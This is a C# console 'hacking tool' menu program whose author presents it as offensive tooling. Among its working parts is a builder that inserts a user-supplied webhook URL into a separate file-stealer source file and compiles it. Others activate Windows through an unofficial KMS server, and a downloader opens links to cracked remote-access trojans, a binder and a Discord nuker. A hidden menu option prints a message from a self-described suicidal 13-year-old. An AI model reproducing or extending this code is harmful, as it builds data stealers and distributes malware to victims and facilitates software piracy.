//Code By le_chat_blanc999

using System;
using System.Diagnostics;
using System.Threading;
using System.IO;

class Program
{
    static void Main(string[] arg)
    {
        Console.Title = "Fusion Tool By le_chat_blanc999 ";

        int consoleWidth = 137;
        int consoleHeight = 38;

        SetConsoleWindowSize(consoleWidth, consoleHeight);

        DisplayMenu();
    }

    static void SetConsoleWindowSize(int width, int height)
    {
        int maxWidth = Console.LargestWindowWidth;
        int maxHeight = Console.LargestWindowHeight;

        if (width > maxWidth || height > maxHeight)
        {
            Console.WriteLine($"The specified size for the console window is too large. The maximum allowed size is {maxWidth}x{maxHeight}.");
            return;
        }

        try
        {
            Console.SetWindowSize(width, height);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error resizing console window: {ex.Message}");
        }
    }

    static void DisplayMenu()
    {
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.WriteLine("Fusion Tool Coded By le_chat_blanc999");

        Console.WriteLine("\n:::::::::: :::    :::  :::::::: ::::::::::: ::::::::  ::::    :::      ::::::::::: ::::::::   ::::::::  :::        \r\n:+:        :+:    :+: :+:    :+:    :+:    :+:    :+: :+:+:   :+:          :+:    :+:    :+: :+:    :+: :+:        \r\n+:+        +:+    +:+ +:+           +:+    +:+    +:+ :+:+:+  +:+          +:+    +:+    +:+ +:+    +:+ +:+        \r\n:#::+::#   +#+    +:+ +#++:++#++    +#+    +#+    +:+ +#+ +:+ +#+          +#+    +#+    +:+ +#+    +:+ +#+        \r\n+#+        +#+    +#+        +#+    +#+    +#+    +#+ +#+  +#+#+#          +#+    +#+    +#+ +#+    +#+ +#+        \r\n#+#        #+#    #+# #+#    #+#    #+#    #+#    #+# #+#   #+#+#          #+#    #+#    #+# #+#    #+# #+#        \r\n###         ########   ######## ########### ########  ###    ####          ###     ########   ########  ########## \r\n\r\n");


        Console.WriteLine("\nSelect an option:");
        Console.WriteLine("1. Windows Auto Activator");
        Console.WriteLine("2. Reverse Shell (Soon)");
        Console.WriteLine("3. Discord Tool (Soon)");
        Console.WriteLine("4. FUD Stealer (Soon)");
        Console.WriteLine("5. FUD File Stealer Builder");
        Console.WriteLine("6. Malware Builder (Soon)");
        Console.WriteLine("7. Source Code Dumper (Soon)");
        Console.WriteLine("8. UAC Escalation (Soon)");
        Console.WriteLine("9. FUD Crypter (Soon)");
        Console.WriteLine("10. Cracked Program Downloader");
        Console.WriteLine("11. Quit");

        while (true)
        {
            Console.Write("Enter your choice number: ");
            string choice = Console.ReadLine();

            switch (choice)
            {
                case "1":
                    Option1();
                    break;
                case "2":
                    Option2();
                    break;
                case "3":
                    Option3();
                    break;
                case "4":
                    Option4();
                    break;
                case "5":
                    Option5();
                    break;
                case "6":
                    Option6();
                    break;
                case "7":
                    Option7();
                    break;
                case "8":
                    Option8();
                    break;
                case "9":
                    Option9();
                    break;
                case "10":
                    Option10();
                    break;
                case "sad day":
                    OptionSadDay();
                    break;
                case "11":
                    Console.WriteLine("Closing Fusion Tool.");
                    return;
                default:
                    Console.WriteLine("Invalid option. Please select a valid option.");
                    break;
            }
        }
    }

    static void ExecuteCmdCommand(string command, string arguments)
    {
        ProcessStartInfo psi = new ProcessStartInfo
        {
            FileName = command,
            Arguments = arguments,
            CreateNoWindow = true,
            UseShellExecute = true,
            Verb = "runas"
        };

        Process.Start(psi)?.WaitForExit();
    }

    static void Option1()
    {
        Console.Clear();

        Console.WriteLine("");

        Console.WriteLine("1/3...");
        ExecuteCmdCommand("cmd.exe", "/C slmgr /ipk \"W269N-WFGWX-YVC9B-4J6C9-T83GX\"");

        Console.WriteLine("2/3...");
        ExecuteCmdCommand("cmd.exe", "/C slmgr /skms kms8.msguides.com");

        Console.WriteLine("3/3...");
        ExecuteCmdCommand("cmd.exe", "/C slmgr /ato");

        Console.WriteLine("\nWindows Is Activated");

        Console.WriteLine("\nPress Enter to return to the main menu...");
        Console.ReadLine();

        Console.Clear();
        DisplayMenu();
    }

    static void Option2()
    {
        Console.Clear();

        Console.WriteLine("Soon");

        Console.WriteLine("\nPress Enter to return to the main menu...");
        Console.ReadLine();

        Console.Clear();
        DisplayMenu();
    }

    static void OptionSadDay()
    {
        Console.Clear();

        Console.WriteLine("Hi, I'm le_chat_blanc999. I'm a young developer, only 13 years old. I know, I'm young XD, but I've been isolating myself for years now, and I'm on the verge of suicide. I'm being bullied at school, mocked, and even physically attacked just because I'm different from everyone else. I feel really bad in my head, and that's why I retreat into the world of computers, where people accept me...");

        Console.WriteLine("\nPress Enter to return to the main menu...");
        Console.ReadLine();

        Console.Clear();
        DisplayMenu();
    }

    static void Option3()
    {
        Console.Clear();

        Console.WriteLine("       ::::::::: ::::::::::: ::::::::   ::::::::   ::::::::  :::::::::  :::::::::      ::::::::::: ::::::::   ::::::::  :::  \r\n     :+:    :+:    :+:    :+:    :+: :+:    :+: :+:    :+: :+:    :+: :+:    :+:         :+:    :+:    :+: :+:    :+: :+:   \r\n    +:+    +:+    +:+    +:+        +:+        +:+    +:+ +:+    +:+ +:+    +:+         +:+    +:+    +:+ +:+    +:+ +:+    \r\n   +#+    +:+    +#+    +#++:++#++ +#+        +#+    +:+ +#++:++#:  +#+    +:+         +#+    +#+    +:+ +#+    +:+ +#+     \r\n  +#+    +#+    +#+           +#+ +#+        +#+    +#+ +#+    +#+ +#+    +#+         +#+    +#+    +#+ +#+    +#+ +#+      \r\n #+#    #+#    #+#    #+#    #+# #+#    #+# #+#    #+# #+#    #+# #+#    #+#         #+#    #+#    #+# #+#    #+# #+#       \r\n######### ########### ########   ########   ########  ###    ### #########          ###     ########   ########## \r\n\r\n");

        Console.WriteLine("\nPress Enter to return to the main menu...");
        Console.ReadLine();

        Console.Clear();
        DisplayMenu();
    }

    static void Option4()
    {
        Console.Clear();

        Console.WriteLine("Soon");

        Console.WriteLine("\nPress Enter to return to the main menu...");
        Console.ReadLine();

        Console.Clear();
        DisplayMenu();
    }

    static void Option5()
    {
        Console.Clear();

        Console.WriteLine(" ______   __     __         ______        ______     ______   ______     ______     __         ______     ______    \r\n/\\  ___\\ /\\ \\   /\\ \\       /\\  ___\\      /\\  ___\\   /\\__  _\\ /\\  ___\\   /\\  __ \\   /\\ \\       /\\  ___\\   /\\  == \\   \r\n\\ \\  __\\ \\ \\ \\  \\ \\ \\____  \\ \\  __\\      \\ \\___  \\  \\/_/\\ \\/ \\ \\  __\\   \\ \\  __ \\  \\ \\ \\____  \\ \\  __\\   \\ \\  __<   \r\n \\ \\_\\    \\ \\_\\  \\ \\_____\\  \\ \\_____\\     \\/\\_____\\    \\ \\_\\  \\ \\_____\\  \\ \\_\\ \\_\\  \\ \\_____\\  \\ \\_____\\  \\ \\_\\ \\_\\ \r\n  \\/_/     \\/_/   \\/_____/   \\/_____/      \\/_____/     \\/_/   \\/_____/   \\/_/\\/_/   \\/_____/   \\/_____/   \\/_/ /_/ \r\n                                                                                                                    \r\n\r\n");
        Console.WriteLine("Builder for Webhook File Stealer");

        Console.WriteLine("Enter Webhook URL: ");
        string webhookUrl = Console.ReadLine();

        UpdateWebhookInFile(webhookUrl);

        ExecuteBuildCommand();

        Console.WriteLine("\nWebhook URL updated successfully and build has been performed.");

        Console.WriteLine("\nPress Enter to return to the main menu...");
        Console.ReadLine();

        Console.Clear();
        DisplayMenu();
    }


    static void UpdateWebhookInFile(string webhookUrl)
    {
        try
        {
            string targetFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "extension", "FileStealer", "FileStealer.cs");

            string[] lines = File.ReadAllLines(targetFilePath);

            for (int i = 0; i < lines.Length; i++)
            {
                if (lines[i].Contains("%WEBHOOK%"))
                {
                    lines[i] = lines[i].Replace("%WEBHOOK%", $"\"{webhookUrl}\"");
                    break;
                }
            }

            File.WriteAllLines(targetFilePath, lines);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error updating webhook in file: {ex.Message}");
        }
    }
    static void ExecuteBuildCommand()
    {
        try
        {
            string filestealerDirectory = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "extension", "FileStealer");

            string filePath = Path.Combine(filestealerDirectory, "FileStealer.cs");

            string buildCommand = $"csc.exe /out:FileStealer.exe FileStealer.cs";

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/C {buildCommand}",
                WorkingDirectory = filestealerDirectory,
                CreateNoWindow = true,
                UseShellExecute = true
            };

            Process.Start(psi)?.WaitForExit();
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error executing build command: {ex.Message}");
        }
    }

    static void Option6()
    {
        Console.Clear();

        Console.WriteLine("Soon");

        Console.WriteLine("\nPress Enter to return to the main menu...");
        Console.ReadLine();

        Console.Clear();
        DisplayMenu();
    }

    static void Option7()
    {
        Console.Clear();

        Console.WriteLine("Soon");

        Console.WriteLine("\nPress Enter to return to the main menu...");
        Console.ReadLine();

        Console.Clear();
        DisplayMenu();
    }

    static void Option8()
    {
        Console.Clear();

        Console.WriteLine("Soon");

        Console.WriteLine("\nPress Enter to return to the main menu...");
        Console.ReadLine();

        Console.Clear();
        DisplayMenu();
    }

    static void Option9()
    {
        Console.Clear();

        Console.WriteLine("Soon");

        Console.WriteLine("\nPress Enter to return to the main menu...");
        Console.ReadLine();

        Console.Clear();
        DisplayMenu();
    }

    static void Option10()
    {
        Console.Clear();

        Console.WriteLine("  /$$$$$$                           /$$                     /$$       /$$$$$$$                                                         \r\n /$$__  $$                         | $$                    | $$      | $$__  $$                                                        \r\n| $$  \\__/ /$$$$$$ /$$$$$$  /$$$$$$| $$   /$$ /$$$$$$  /$$$$$$$      | $$  \\ $$/$$$$$$  /$$$$$$  /$$$$$$  /$$$$$$ /$$$$$$ /$$$$$$/$$$$ \r\n| $$      /$$__  $|____  $$/$$_____| $$  /$$//$$__  $$/$$__  $$      | $$$$$$$/$$__  $$/$$__  $$/$$__  $$/$$__  $|____  $| $$_  $$_  $$\r\n| $$     | $$  \\__//$$$$$$| $$     | $$$$$$/| $$$$$$$| $$  | $$      | $$____| $$  \\__| $$  \\ $| $$  \\ $| $$  \\__//$$$$$$| $$ \\ $$ \\ $$\r\n| $$    $| $$     /$$__  $| $$     | $$_  $$| $$_____| $$  | $$      | $$    | $$     | $$  | $| $$  | $| $$     /$$__  $| $$ | $$ | $$\r\n|  $$$$$$| $$    |  $$$$$$|  $$$$$$| $$ \\  $|  $$$$$$|  $$$$$$$      | $$    | $$     |  $$$$$$|  $$$$$$| $$    |  $$$$$$| $$ | $$ | $$\r\n \\______/|__/     \\_______/\\_______|__/  \\__/\\_______/\\_______/      |__/    |__/      \\______/ \\____  $|__/     \\_______|__/ |__/ |__/\r\n                                                                                                /$$  \\ $$                              \r\n                                                                                               |  $$$$$$/                              \r\n                                                                                                \\______/                               \r\n\r\n");

        Console.WriteLine("Choose the program you want to download:");
        Console.WriteLine("1. GANGNUKER CRACKED");
        Console.WriteLine("2. Silver RAT");
        Console.WriteLine("3. Anarchy Panel V4.7.7");
        Console.WriteLine("4. Latest version of CraxRAT");
        Console.WriteLine("5. 888 RAT v1.2.6.7");
        Console.WriteLine("6. Xbinder V2");
        Console.WriteLine("7. Back to main menu");

        while (true)
        {
            Console.Write("Enter your choice number: ");
            string choice = Console.ReadLine();

            switch (choice)
            {
                case "1":
                    Option10_SubOption1();
                    break;
                case "2":
                    Option10_SubOption2();
                    break;
                case "3":
                    Option10_SubOption3();
                    break;
                case "4":
                    Option10_SubOption4();
                    break;
                case "5":
                    Option10_SubOption5();
                    break;
                case "6":
                    Option10_SubOption6();
                    break;
                case "7":
                    Console.WriteLine("Returning to the main menu.");
                    Console.Clear();
                    DisplayMenu();
                    return;
                default:
                    Console.WriteLine("Invalid option. Please select a valid option.");
                    break;
            }
        }
    }


    static void Option10_SubOption1()
    {
        Console.WriteLine("Redirecting to GangNuker download page...");
        {
            string url = "https://mega.nz/file/5yVhXApS#RWbhJ7ZoDfqp_YAgS3yVCVdWn1CvsOcrGkTDeyKoAgI";

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = url,
                UseShellExecute = true
            };

            Process.Start(psi);
        }
        Console.WriteLine("\nPress Enter to return to the main menu...");
        Console.ReadLine();
        Console.Clear();
        DisplayMenu();
    }

    static void Option10_SubOption2()
    {
        Console.WriteLine("Redirecting to Silver RAT download page...");
        {
            string url = "https://github.com/freeman649";

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = url,
                UseShellExecute = true
            };

            Process.Start(psi);
        }
        Console.WriteLine("\nPress Enter to return to the main menu...");
        Console.ReadLine();
        Console.Clear();
        DisplayMenu();
    }

    static void Option10_SubOption3()
    {
        Console.WriteLine("Redirecting to Anarchy Panel V4.7.7 download page...");
        {
            string url = "https://mega.nz/file/tA8GhS4Y#cXCCOKr1ZpKWKUPN05RnhA9zKYmEsgul_EIG_PueZHM";

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = url,
                UseShellExecute = true
            };

            Process.Start(psi);
        }
        Console.WriteLine("\nPress Enter to return to the main menu...");
        Console.ReadLine();
        Console.Clear();
        DisplayMenu();
    }

    static void Option10_SubOption4()
    {
        Console.WriteLine("Redirecting to Latest version of CraxRAT download page...");
        {
            {
                string url = "https://github.com/freeman649";

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = url,
                    UseShellExecute = true
                };

                Process.Start(psi);
            }
        }
        Console.WriteLine("\nPress Enter to return to the main menu...");
        Console.ReadLine();
        Console.Clear();
        DisplayMenu();
    }

    static void Option10_SubOption5()
    {
        Console.WriteLine("Redirecting to 888 RAT v1.2.6.7 download page...");
        {
            string url = "https://github.com/freeman649";

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = url,
                UseShellExecute = true
            };

            Process.Start(psi);
        }
        Console.WriteLine("\nPress Enter to return to the main menu...");
        Console.ReadLine();
        Console.Clear();
        DisplayMenu();
    }

    static void Option10_SubOption6()
    {
        Console.WriteLine("Redirecting to Xbinder V2 download page...");
        {
            string url = "https://mega.nz/file/gJ8DhTTT#SDZhPyZI-le4gUPZs-OgxL_tDj-FhVIJXkZWzCqjhq0";

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = url,
                UseShellExecute = true
            };

            Process.Start(psi);
        }
        Console.WriteLine("\nPress Enter to return to the main menu...");
        Console.ReadLine();
        Console.Clear();
        DisplayMenu();
    }
}
